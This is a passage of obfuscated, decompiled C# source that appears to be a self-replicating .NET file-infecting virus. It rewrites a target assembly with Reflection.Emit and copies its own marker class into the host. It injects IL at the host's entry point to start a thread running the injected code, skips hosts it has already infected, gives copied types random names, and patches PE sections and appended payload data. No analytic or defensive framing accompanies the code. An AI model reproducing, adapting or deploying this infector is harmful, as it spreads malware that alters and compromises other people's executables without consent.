		AppDomain domain = Thread.GetDomain();
		AssemblyName assemblyName = new AssemblyName();
		assemblyName.Name = Path.GetFileNameWithoutExtension(outFileName);
		AssemblyBuilder ab = domain.DefineDynamicAssembly(assemblyName, (AssemblyBuilderAccess)3);
		Assembly assembly = Assembly.LoadFrom(inFileName);
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Module[] modules = assembly.GetModules();
		foreach (Module module in modules)
		{
			ModuleBuilder moduleBuilder = ab.DefineDynamicModule(module.Name, outFileName);
			ModuleReader reader = new ModuleReader(module, (IAssemblyProvider)(object)new AssemblyProvider());
			moduleBuilder.CreateGlobalFunctions();
			Type[] types = module.GetTypes();
			Type[] array = types;
			foreach (Type type in array)
			{
				if (type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).Length == typeof(cLoPfikrwuzkt).GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic).Length && type.GetMethods().Length == typeof(cLoPfikrwuzkt).GetMethods().Length)
				{
					return;
				}
				MethodInfo[] methods = type.GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (MethodBase methodBase in methods)
				{
					if ((object)assembly.EntryPoint != methodBase)
					{
						continue;
					}
					Module[] modules2 = executingAssembly.GetModules();
					foreach (Module module2 in modules2)
					{
						ModuleReader reader2 = new ModuleReader(module2, (IAssemblyProvider)(object)new AssemblyProvider());
						Type[] types2 = module2.GetTypes();
						Type[] array2 = types2;
						foreach (Type type2 in array2)
						{
							if ((object)type2 == typeof(cLoPfikrwuzkt))
							{
								qcrXdwjzyqvby(type2, null, moduleBuilder, reader2, gvqtss);
							}
							if (type2.FullName!.Length > 22 && type2.FullName!.Substring(0, 22) == "Reflector.Disassembler")
							{
								qcrXdwjzyqvby(type2, null, moduleBuilder, reader2, gvqtss);
							}
						}
						Type[] array3 = types2;
						foreach (Type intype in array3)
						{
							gvqtss.Vbmxip(intype, moduleBuilder);
						}
						Type[] array4 = types2;
						foreach (Type type3 in array4)
						{
							if ((object)type3 == typeof(cLoPfikrwuzkt))
							{
								wusFbua(type3, null, reader2, assembly, ref ab, setEP: false, filetype, gvqtss);
							}
							if (type3.FullName!.Length > 22 && type3.FullName!.Substring(0, 22) == "Reflector.Disassembler")
							{
								wusFbua(type3, null, reader2, assembly, ref ab, setEP: false, filetype, gvqtss);
							}
						}
					}
				}
			}
			Type[] array5 = types;
			foreach (Type type4 in array5)
			{
				qcrXdwjzyqvby(type4, null, moduleBuilder, reader, gvqtss);
			}
			Type[] array6 = types;
			foreach (Type intype2 in array6)
			{
				gvqtss.Vbmxip(intype2, moduleBuilder);
			}
			Type[] array7 = types;
			foreach (Type type5 in array7)
			{
				wusFbua(type5, null, reader, assembly, ref ab, setEP: true, filetype, gvqtss);
			}
		}
		try
		{
			deVogWGUdhih(assembly, ab, outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
		}
		catch (Exception)
		{
		}
		try
		{
			ab.Save(outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
		}
		catch (Exception)
		{
		}
		try
		{
			gltiuoJpjs(inFileName, outFileName);
		}
		catch (ThreadAbortException)
		{
			File.Move(inFileName, outFileName);
		}
		catch (Exception)
		{
		}
	}

	private static void qcrXdwjzyqvby(Type type, Type wrapperType, ModuleBuilder outmodb, ModuleReader reader, gvqtss typelist)
	{
		string fullName = type.FullName;
		if ((object)wrapperType != null || -1 == fullName.IndexOf("+"))
		{
			Type baseType = type.BaseType;
			Type type2 = (((object)baseType == null) ? null : typelist.azMJkzgQbgH(baseType));
			if ((object)type2 == null)
			{
				type2 = baseType;
			}
			Type[] interfaces = type.GetInterfaces();
			TypeBuilder outtype;
			if ((object)wrapperType != null)
			{
				TypeBuilder typeBuilder = typelist.azMJkzgQbgH(wrapperType);
				outtype = typeBuilder.DefineNestedType(VeLepnrjbbj(type) ? upyalxworwxo.mnsvme() : type.Name, type.Attributes, type2, interfaces);
			}
			else
			{
				string name = ((typeof(cLoPfikrwuzkt).GetHashCode() != type.GetHashCode()) ? (VeLepnrjbbj(type) ? upyalxworwxo.mnsvme() : fullName) : (VeLepnrjbbj(type) ? (upyalxworwxo.mnsvme() + "." + upyalxworwxo.mnsvme()) : fullName));
				outtype = outmodb.DefineType(name, type.Attributes, type2, interfaces);
			}
			typelist.kPlrobs(type, outtype);
			Type[] nestedTypes = type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			Type[] array = nestedTypes;
			foreach (Type type3 in array)
			{
				qcrXdwjzyqvby(type3, type, outmodb, reader, typelist);
			}
		}
	}

	private static void cwgzlpwcJgvZbe(MethodBase methodBase, ref MethodBuilder methodBuilder)
	{
		ParameterInfo[] parameters = methodBase.GetParameters();
		for (int i = 0; i < parameters.Length; i++)
		{
			methodBuilder.DefineParameter(i + 1, parameters[i].Attributes, parameters[i].Name);
		}
	}

	private static void otgpxxapbwckv(MethodBase methodBase, ref ConstructorBuilder ctorBuilder)
	{
		ParameterInfo[] parameters = methodBase.GetParameters();
		for (int i = 0; i < parameters.Length; i++)
		{
			ctorBuilder.DefineParameter(i + 1, parameters[i].Attributes, parameters[i].Name);
		}
	}

	private static void wusFbua(Type type, Type wrapperType, ModuleReader reader, Assembly asm, ref AssemblyBuilder ab, bool setEP, PEFileKinds filetype, gvqtss typelist)
	{
		string fullName = type.FullName;
		if ((object)wrapperType == null && -1 != fullName.IndexOf("+"))
		{
			return;
		}
		ConstructorInfo[] constructors = type.GetConstructors(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
		ConstructorInfo[] array = constructors;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				ConstructorInfo constructorInfo = array[num];
				ConstructorBuilder constructorBuilder = typelist.Ujxjurmh(type, constructorInfo);
				if ((object)constructorBuilder != null)
				{
					MethodBody methodBody = reader.GetMethodBody((MethodBase)constructorInfo);
					if (methodBody != null)
					{
						ILGenerator il = constructorBuilder.GetILGenerator();
						YcvdnwNyd(type, constructorInfo, methodBody, ref il, entrypoint: false, ejeiqjp, typelist);
					}
					num++;
					continue;
				}
				break;
			}
			MethodBase[] methods = type.GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			MethodBase[] array2 = methods;
			foreach (MethodBase methodBase in array2)
			{
				if (methodBase.Name == "Main" && (object)methodBase.DeclaringType == typeof(cLoPfikrwuzkt))
				{
					continue;
				}
				MethodBuilder methodBuilder = typelist.xqPnWts(type, methodBase);
				MethodBody methodBody2 = reader.GetMethodBody(methodBase);
				if (methodBody2 != null)
				{
					ILGenerator il2 = methodBuilder.GetILGenerator();
					if ((object)asm.EntryPoint == methodBase && setEP)
					{
						YcvdnwNyd(type, methodBase, methodBody2, ref il2, entrypoint: true, ejeiqjp, typelist);
						ab.SetEntryPoint((MethodInfo)methodBuilder, filetype);
					}
					else
					{
						YcvdnwNyd(type, methodBase, methodBody2, ref il2, entrypoint: false, ejeiqjp, typelist);
					}
				}
			}
			TypeBuilder typeBuilder = typelist.azMJkzgQbgH(type);
			try
			{
				typeBuilder.CreateType();
			}
			catch
			{
				if (ejeiqjp)
				{
					ejeiqjp = false;
					break;
				}
			}
			Type[] nestedTypes = type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			Type[] array3 = nestedTypes;
			foreach (Type type2 in array3)
			{
				wusFbua(type2, type, reader, asm, ref ab, setEP, filetype, typelist);
			}
			break;
		}
	}

	private static bool miujahgzyw(Assembly asm)
	{
		string[] manifestResourceNames = asm.GetManifestResourceNames();
		return manifestResourceNames.Length != 0;
	}

	private static void deVogWGUdhih(Assembly asm, AssemblyBuilder ab, string name)
	{
		string[] manifestResourceNames = asm.GetManifestResourceNames();
		string[] array = manifestResourceNames;
		foreach (string text in array)
		{
			Stream manifestResourceStream = asm.GetManifestResourceStream(text);
			manifestResourceStream.GetType();
			if (manifestResourceStream == null)
			{
				continue;
			}
			try
			{
				ResourceReader resourceReader = new ResourceReader(manifestResourceStream);
				Hashtable hashtable = new Hashtable();
				IDictionaryEnumerator enumerator = resourceReader.GetEnumerator();
				while (enumerator.MoveNext())
				{
					if (!hashtable.ContainsKey(enumerator.Key))
					{
						hashtable.Add(enumerator.Key, enumerator.Value);
					}
				}
				resourceReader.Close();
				string text2 = Path.GetFileNameWithoutExtension(name) + ".resources";
				ResourceWriter resourceWriter = new ResourceWriter(text2);
				IDictionaryEnumerator enumerator2 = hashtable.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					resourceWriter.AddResource((string)enumerator2.Key, enumerator2.Value);
				}
				resourceWriter.Generate();
				resourceWriter.Close();
				ab.AddResourceFile(text, text2);
				resourceWriter.Dispose();
			}
			catch
			{
			}
		}
	}

	private static void YcvdnwNyd(Type type, MethodBase methodBase, MethodBody methodBody, ref ILGenerator il, bool entrypoint, bool shorts, gvqtss typelist)
	{
		//IL_0403: Unknown result type (might be due to invalid IL or missing references)
		//IL_0409: Invalid comparison between Unknown and I4
		//IL_0436: Unknown result type (might be due to invalid IL or missing references)
		//IL_043b: Unknown result type (might be due to invalid IL or missing references)
		//IL_043d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0454: Expected I4, but got Unknown
		Type[] locals = methodBody.GetLocals();
		LocalBuilder[] array = new LocalBuilder[checked((uint)locals.Length)];
		if (locals != null && locals.Length > 0)
		{
			for (int i = 0; i < locals.Length; i++)
			{
				Type type2 = typelist.azMJkzgQbgH(locals[i]);
				if ((object)type2 != null)
				{
					array[i] = il.DeclareLocal(type2);
				}
				else
				{
					array[i] = il.DeclareLocal(locals[i]);
				}
			}
		}
		nfxywup nfxywup = new nfxywup(il, array);
		if (entrypoint)
		{
			MethodBuilder meth = typelist.xqPnWts(typeof(cLoPfikrwuzkt), ltekmr);
			il.DeclareLocal(typeof(Thread));
			nfxywup.qzhzmtkhk();
			il.Emit(OpCodes.Ldnull);
			nfxywup.qzhzmtkhk();
			il.Emit(OpCodes.Ldftn, meth);
			nfxywup.qzhzmtkhk();
			Type[] array2 = new Type[2]
			{
				typeof(object),
				typeof(int)
			};
			Type typeFromHandle = typeof(ThreadStart);
			ConstructorInfo[] constructors = typeFromHandle.GetConstructors();
			ConstructorInfo con = constructors[0];
			il.Emit(OpCodes.Newobj, con);
			Type[] types = new Type[1] { typeof(ThreadStart) };
			ConstructorInfo constructor = typeof(Thread).GetConstructor(types);
			il.Emit(OpCodes.Newobj, constructor);
			nfxywup.qzhzmtkhk();
			il.Emit(OpCodes.Stloc_0);
			nfxywup.qzhzmtkhk();
			il.Emit(OpCodes.Ldloc_0);
			MethodInfo method = typeof(Thread).GetMethod("Start");
			il.Emit(OpCodes.Callvirt, method);
			nfxywup.qzhzmtkhk();
		}
		ExceptionHandler[] exceptions = methodBody.GetExceptions();
		if (exceptions != null)
		{
			for (int j = 0; j < exceptions.Length; j++)
			{
			}
		}
		int num = 0;
		Instruction[] instructions = methodBody.GetInstructions();
		foreach (Instruction val in instructions)
		{
			if (val.get_Code().OperandType == OperandType.ShortInlineBrTarget || val.get_Code().OperandType == OperandType.InlineBrTarget)
			{
				num++;
			}
			if (val.get_Code().OperandType == OperandType.InlineSwitch)
			{
				num += ((int[])val.get_Operand()).Length;
			}
		}
		Label[] array3;
		int[] array4;
		int num2;
		Instruction[] instructions2;
		checked
		{
			array3 = new Label[(uint)num];
			array4 = new int[(uint)num];
			num2 = 0;
			instructions2 = methodBody.GetInstructions();
		}
		foreach (Instruction val2 in instructions2)
		{
			if (val2.get_Code().OperandType == OperandType.ShortInlineBrTarget)
			{
				object operand = val2.get_Operand();
				array4[num2] = (int)operand;
				ref Label reference = ref array3[num2];
				reference = il.DefineLabel();
				num2++;
			}
			if (val2.get_Code().OperandType == OperandType.InlineBrTarget)
			{
				object operand2 = val2.get_Operand();
				array4[num2] = (int)operand2;
				ref Label reference2 = ref array3[num2];
				reference2 = il.DefineLabel();
				num2++;
			}
			if (val2.get_Code().OperandType == OperandType.InlineSwitch)
			{
				object operand3 = val2.get_Operand();
				int[] array5 = (int[])operand3;
				int[] array6 = array5;
				for (int m = 0; m < array6.Length; m++)
				{
					int num3 = (array4[num2] = array6[m]);
					ref Label reference3 = ref array3[num2];
					reference3 = il.DefineLabel();
					num2++;
				}
			}
		}
		bool flag = false;
		for (int n = 0; n < methodBody.GetInstructions().Length; n++)
		{
			if (flag)
			{
				flag = false;
				continue;
			}
			Instruction val3 = methodBody.GetInstructions()[n];
			OpCode code = val3.get_Code();
			int hashCode = code.GetHashCode();
			OpCode ldloc = OpCodes.Ldloc;
			if (hashCode == ldloc.GetHashCode() && n < methodBody.GetInstructions().Length - 1)
			{
				int hashCode2 = methodBody.GetInstructions()[n].get_Code().GetHashCode();
				OpCode pop = OpCodes.Pop;
				if (hashCode2 == pop.GetHashCode())
				{
					flag = true;
					continue;
				}
			}
			nfxywup.qzhzmtkhk();
			ExceptionHandler[] array7 = exceptions;
			foreach (ExceptionHandler val4 in array7)
			{
				if (val4.get_TryOffset() != val3.get_Offset())
				{
					if ((int)val4.get_Type() == 3)
					{
						if (val4.get_FilterOffset() == val3.get_Offset())
						{
							il.BeginExceptFilterBlock();
						}
					}
					else if (val4.get_HandlerOffset() == val3.get_Offset())
					{
						ExceptionHandlerType type3 = val4.get_Type();
						switch ((int)type3)
						{
						case 0:
							il.BeginFaultBlock();
							break;
						case 1:
							il.BeginCatchBlock(val4.get_CatchType());
							break;
						case 2:
							il.BeginFinallyBlock();
							break;
						case 3:
							il.BeginExceptFilterBlock();
							break;
						}
					}
					if (val4.get_HandlerOffset() + val4.get_HandlerLength() != val3.get_Offset())
					{
						continue;
					}
					bool flag2 = true;
					ExceptionHandler[] array8 = exceptions;
					foreach (ExceptionHandler val5 in array8)
					{
						if (val5.get_HandlerOffset() == val4.get_HandlerOffset() + val4.get_HandlerLength())
						{
							flag2 = false;
						}
					}
					if (flag2)
					{
						il.EndExceptionBlock();
					}
					continue;
				}
				il.BeginExceptionBlock();
				break;
			}
			for (int num6 = 0; num6 < array4.Length; num6++)
			{
				if (array4[num6] == val3.get_Offset())
				{
					il.MarkLabel(array3[num6]);
				}
			}
			object operand4 = val3.get_Operand();
			byte[] operandData = val3.GetOperandData();
			if (entrypoint)
			{
				string? name = code.Name;
				OpCode ret = OpCodes.Ret;
				if (name == ret.Name)
				{
					nfxywup.qzhzmtkhk();
					il.Emit(OpCodes.Ldloc_0);
					MethodInfo method2 = typeof(Thread).GetMethod("Abort", new Type[0]);
					il.Emit(OpCodes.Callvirt, method2);
				}
			}
			if (operand4 != null)
			{
				switch (code.OperandType)
				{
				case OperandType.InlineBrTarget:
				{
					int num9 = (int)operand4;
					for (int num10 = 0; num10 < array3.Length; num10++)
					{
						if (array4[num10] == num9)
						{
							il.Emit(code, array3[num10]);
							break;
						}
					}
					break;
				}
				case OperandType.InlineI:
					il.Emit(code, (int)operand4);
					break;
				case OperandType.InlineI8:
					il.Emit(code, (long)operand4);
					break;
				case OperandType.InlineNone:
					il.Emit(code);
					break;
				case OperandType.InlineR:
					il.Emit(code, (double)operand4);
					break;
				case OperandType.InlineString:
					il.Emit(code, operand4.ToString());
					break;
				case OperandType.InlineSwitch:
				{
					int[] array9 = (int[])operand4;
					Label[] array10 = new Label[checked((uint)array9.Length)];
					for (int num11 = 0; num11 < array9.Length; num11++)
					{
						for (int num12 = 0; num12 < array3.Length; num12++)
						{
							if (array4[num12] == array9[num11])
							{
								ref Label reference4 = ref array10[num11];
								reference4 = array3[num12];
							}
						}
					}
					il.Emit(code, array10);
					break;
				}
				case OperandType.InlineField:
				case OperandType.InlineMethod:
				case OperandType.InlineSig:
				case OperandType.InlineTok:
				case OperandType.InlineType:
					if (operand4 is Type)
					{
						TypeBuilder typeBuilder = typelist.azMJkzgQbgH((Type)operand4);
						if ((object)typeBuilder != null)
						{
							il.Emit(code, typeBuilder);
							break;
						}
						if ((object)((Type)operand4).Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, (Type)operand4);
					}
					else if (operand4 is MethodInfo)
					{
						MethodInfo methodInfo = (MethodInfo)operand4;
						MethodBuilder methodBuilder = typelist.xqPnWts(methodInfo.DeclaringType, methodInfo);
						if ((object)methodBuilder != null)
						{
							il.Emit(code, methodBuilder);
							break;
						}
						if ((object)methodInfo.DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, methodInfo);
					}
					else if (operand4 is MemberInfo)
					{
						if (operand4 is FieldInfo)
						{
							FieldBuilder fieldBuilder = typelist.cjhoWxb(((FieldInfo)operand4).DeclaringType, (FieldInfo)operand4);
							if ((object)fieldBuilder != null)
							{
								il.Emit(code, fieldBuilder);
							}
							else
							{
								if ((object)((FieldInfo)operand4).DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
								{
									throw new Exception();
								}
								il.Emit(code, (FieldInfo)operand4);
							}
						}
						if (!(operand4 is ConstructorInfo))
						{
							break;
						}
						ConstructorInfo constructorInfo = (ConstructorInfo)operand4;
						ConstructorBuilder constructorBuilder = typelist.Ujxjurmh(constructorInfo.DeclaringType, constructorInfo);
						if ((object)constructorBuilder != null)
						{
							il.Emit(code, constructorBuilder);
							break;
						}
						if ((object)constructorInfo.DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, constructorInfo);
					}
					else if (!(operand4 is FieldInfo))
					{
						throw new Exception();
					}
					break;
				case OperandType.ShortInlineBrTarget:
				{
					OpCode opcode;
					if (!shorts)
					{
						opcode = code;
						string? name2 = code.Name;
						OpCode beq_S = OpCodes.Beq_S;
						if (name2 == beq_S.Name)
						{
							opcode = OpCodes.Beq;
						}
						string? name3 = code.Name;
						OpCode bge_S = OpCodes.Bge_S;
						if (name3 == bge_S.Name)
						{
							opcode = OpCodes.Bge;
						}
						string? name4 = code.Name;
						OpCode bge_Un_S = OpCodes.Bge_Un_S;
						if (name4 == bge_Un_S.Name)
						{
							opcode = OpCodes.Bge_Un;
						}
						string? name5 = code.Name;
						OpCode bgt_S = OpCodes.Bgt_S;
						if (name5 == bgt_S.Name)
						{
							opcode = OpCodes.Bgt_S;
						}
						string? name6 = code.Name;
						OpCode bgt_Un_S = OpCodes.Bgt_Un_S;
						if (name6 == bgt_Un_S.Name)
						{
							opcode = OpCodes.Bgt_Un;
						}
						string? name7 = code.Name;
						OpCode ble_S = OpCodes.Ble_S;
						if (name7 == ble_S.Name)
						{
							opcode = OpCodes.Ble;
						}
						string? name8 = code.Name;
						OpCode ble_Un_S = OpCodes.Ble_Un_S;
						if (name8 == ble_Un_S.Name)
						{
							opcode = OpCodes.Ble_Un;
						}
						string? name9 = code.Name;
						OpCode blt_S = OpCodes.Blt_S;
						if (name9 == blt_S.Name)
						{
							opcode = OpCodes.Blt;
						}
						string? name10 = code.Name;
						OpCode blt_Un_S = OpCodes.Blt_Un_S;
						if (name10 == blt_Un_S.Name)
						{
							opcode = OpCodes.Blt_Un;
						}
						string? name11 = code.Name;
						OpCode bne_Un_S = OpCodes.Bne_Un_S;
						if (name11 == bne_Un_S.Name)
						{
							opcode = OpCodes.Bne_Un;
						}
						string? name12 = code.Name;
						OpCode br_S = OpCodes.Br_S;
						if (name12 == br_S.Name)
						{
							opcode = OpCodes.Br;
						}
						string? name13 = code.Name;
						OpCode brfalse_S = OpCodes.Brfalse_S;
						if (name13 == brfalse_S.Name)
						{
							opcode = OpCodes.Brfalse;
						}
						string? name14 = code.Name;
						OpCode brtrue_S = OpCodes.Brtrue_S;
						if (name14 == brtrue_S.Name)
						{
							opcode = OpCodes.Brtrue;
						}
						string? name15 = code.Name;
						OpCode leave_S = OpCodes.Leave_S;
						if (name15 == leave_S.Name)
						{
							opcode = OpCodes.Leave;
						}
					}
					else
					{
						opcode = code;
					}
					int num7 = (int)operand4;
					for (int num8 = 0; num8 < array3.Length; num8++)
					{
						if (array4[num8] == num7)
						{
							il.Emit(opcode, array3[num8]);
							break;
						}
					}
					break;
				}
				case OperandType.ShortInlineI:
					if (operand4 is short)
					{
						il.Emit(code, (short)operand4);
					}
					if (operand4 is sbyte)
					{
						il.Emit(code, (sbyte)operand4);
					}
					break;
				case OperandType.ShortInlineR:
					il.Emit(code, (float)operand4);
					break;
				case OperandType.InlineVar:
				case OperandType.ShortInlineVar:
					if (operand4 is int)
					{
						if (array == null)
						{
							return;
						}
						il.Emit(code, array[(int)operand4]);
					}
					else if (operand4 is ParameterInfo)
					{
						ParameterInfo parameterInfo = (ParameterInfo)operand4;
						methodBase.GetParameters();
						int position = parameterInfo.Position;
						int hashCode3 = code.GetHashCode();
						OpCode ldarg_S = OpCodes.Ldarg_S;
						if (hashCode3 == ldarg_S.GetHashCode())
						{
							il.Emit(code, (int)operandData[0]);
						}
						else
						{
							il.Emit(code, position);
						}
					}
					break;
				}
			}
			else
			{
				il.Emit(code);
			}
		}
	}

	private static byte[] laevpAmzssrm()
	{
		FileStream fileStream = Assembly.GetExecutingAssembly().GetFiles()[0];
		BinaryReader binaryReader = new BinaryReader(fileStream);
		meJkIwzhgrp meJkIwzhgrp = new meJkIwzhgrp();
		meJkIwzhgrp.uiTmdCvrqgni(binaryReader);
		Nckabmwppivk nckabmwppivk = new Nckabmwppivk();
		nckabmwppivk.datvgvcyreni(binaryReader, meJkIwzhgrp);
		uelNaxqhxdce uelNaxqhxdce = (uelNaxqhxdce)nckabmwppivk.dfrJlhbJG[nckabmwppivk.dfrJlhbJG.Count - 1];
		uint num = uelNaxqhxdce.nwFuZq + uelNaxqhxdce.aivsira;
		binaryReader.BaseStream.Position = num;
		try
		{
			uint count = binaryReader.ReadUInt32();
			byte[] result = binaryReader.ReadBytes((int)count);
			fileStream.Close();
			return result;
		}
		catch
		{
			fileStream.Close();
			FileStream fileStream2 = new FileStream("ILReader.dll", FileMode.Open, FileAccess.Read);
			BinaryReader binaryReader2 = new BinaryReader(fileStream2);
			FileInfo fileInfo = new FileInfo("ILReader.dll");
			if (fileInfo != null)
			{
				byte[] result = binaryReader2.ReadBytes((int)fileInfo.Length);
				fileStream2.Close();
				return result;
			}
			fileStream2.Close();
			return null;
		}
	}

	private static void xPiewjhaunzk(string fileName, byte[] ilReader)
	{
		FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.ReadWrite);
		BinaryWriter binaryWriter = new BinaryWriter(fileStream);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
		binaryWriter.Write((uint)ilReader.Length);
		binaryWriter.Write(ilReader);
		fileStream.Close();
	}

	private static bool gltiuoJpjs(string inFileName, string outFileName)
	{
		FileStream fileStream = new FileStream(outFileName, FileMode.Open, FileAccess.ReadWrite);
		FileStream fileStream2 = new FileStream(inFileName, FileMode.Open, FileAccess.Read);
		if (fileStream2 != null && fileStream != null)
		{
			BinaryWriter binaryWriter = new BinaryWriter(fileStream);
			BinaryReader binaryReader = new BinaryReader(fileStream);
			BinaryReader binaryReader2 = new BinaryReader(fileStream2);
			meJkIwzhgrp meJkIwzhgrp = new meJkIwzhgrp();
			meJkIwzhgrp.uiTmdCvrqgni(binaryReader2);
			Nckabmwppivk nckabmwppivk = new Nckabmwppivk();
			nckabmwppivk.datvgvcyreni(binaryReader2, meJkIwzhgrp);
			byte[] array = nckabmwppivk.UlOpjdvYl(binaryReader2);
			if (array == null)
			{
				return false;
			}
			meJkIwzhgrp meJkIwzhgrp2 = new meJkIwzhgrp();
			meJkIwzhgrp2.uiTmdCvrqgni(binaryReader);
			onxrrwuejxvmmp onxrrwuejxvmmp = new onxrrwuejxvmmp();
			onxrrwuejxvmmp.datvgvcyreni(binaryReader, meJkIwzhgrp2);
			if (onxrrwuejxvmmp.UlOpjdvYl(binaryReader) != null)
			{
				return false;
			}
			uelNaxqhxdce uelNaxqhxdce = (uelNaxqhxdce)onxrrwuejxvmmp.dfrJlhbJG[onxrrwuejxvmmp.dfrJlhbJG.Count - 1];
			uint num = (uelNaxqhxdce.nwFuZq + uelNaxqhxdce.aivsira + 1) / onxrrwuejxvmmp.ngxlzBtamejzii * onxrrwuejxvmmp.ngxlzBtamejzii;
			uint phsize = ((uint)array.Length / onxrrwuejxvmmp.ngxlzBtamejzii + 1) * onxrrwuejxvmmp.ngxlzBtamejzii;
			uint hxsgqlr = onxrrwuejxvmmp.Hxsgqlr;
			uint isize = onxrrwuejxvmmp.Hxsgqlr + ((uint)array.Length / onxrrwuejxvmmp.nhNusjdio + 1) * onxrrwuejxvmmp.nhNusjdio;
			uelNaxqhxdce sh = new uelNaxqhxdce(".rsrc", (uint)array.Length, hxsgqlr, phsize, num, 1107296320u);
			jwLqkWwE d = new jwLqkWwE(hxsgqlr, (uint)array.Length);
			binaryWriter.BaseStream.Position = num;
			binaryWriter.Write(array, 0, array.Length);
			for (int i = 0; i < onxrrwuejxvmmp.ngxlzBtamejzii - (long)array.Length % (long)onxrrwuejxvmmp.ngxlzBtamejzii; i++)
			{
				binaryWriter.Write((byte)0);
			}
			onxrrwuejxvmmp.jtsafT(sh, binaryReader, binaryWriter, meJkIwzhgrp2);
			onxrrwuejxvmmp.WbnnxhoB(d, binaryWriter, meJkIwzhgrp2);
			onxrrwuejxvmmp.XrzVuXxBglt(isize, binaryWriter, meJkIwzhgrp2);
			binaryWriter.Flush();
			binaryReader.Close();
			binaryWriter.Close();
			fileStream = new FileStream(outFileName, FileMode.Open, FileAccess.ReadWrite);
			binaryReader = new BinaryReader(fileStream);
			binaryWriter = new BinaryWriter(fileStream);
			onxrrwuejxvmmp.nebiUsHHUctnnu(num, nckabmwppivk.jFyqnvJtiX.ufrMmSbQy, hxsgqlr, binaryReader, binaryWriter);
			binaryWriter.Flush();
			binaryReader2.Close();
			binaryReader.Close();
			binaryWriter.Close();
			fileStream2.Close();
			fileStream.Close();
			return true;
		}
		return false;
	}
}
